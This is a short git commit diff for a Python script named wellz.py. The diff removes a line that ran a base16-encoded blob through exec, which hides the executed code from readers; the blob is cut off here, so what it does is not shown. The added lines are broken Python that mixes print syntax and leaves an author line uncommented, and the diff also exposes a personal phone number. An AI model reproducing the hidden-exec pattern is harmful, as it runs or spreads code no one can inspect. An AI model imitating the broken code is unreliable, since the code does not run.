948b35b991cd3482b78a01d1dbf073f45199959c
Amalowo <74058394+Amalowo@users.noreply.github.com>
2020-11-24 00:31:49 +0100

    wellz.py

--- wellz.py
+++ wellz.py
@@ -1,5 +1,6 @@
-#  Author : Wellzamalowo
+print 3*("\n")
+print(" This Amani of lagos ")
+Author : Wellzamalowo
 #  github  : https://github.com/Amalowo
 #  whatsapp  : 07058796493
  import base64
- exec(base64.b16decode('2320436F6D7069
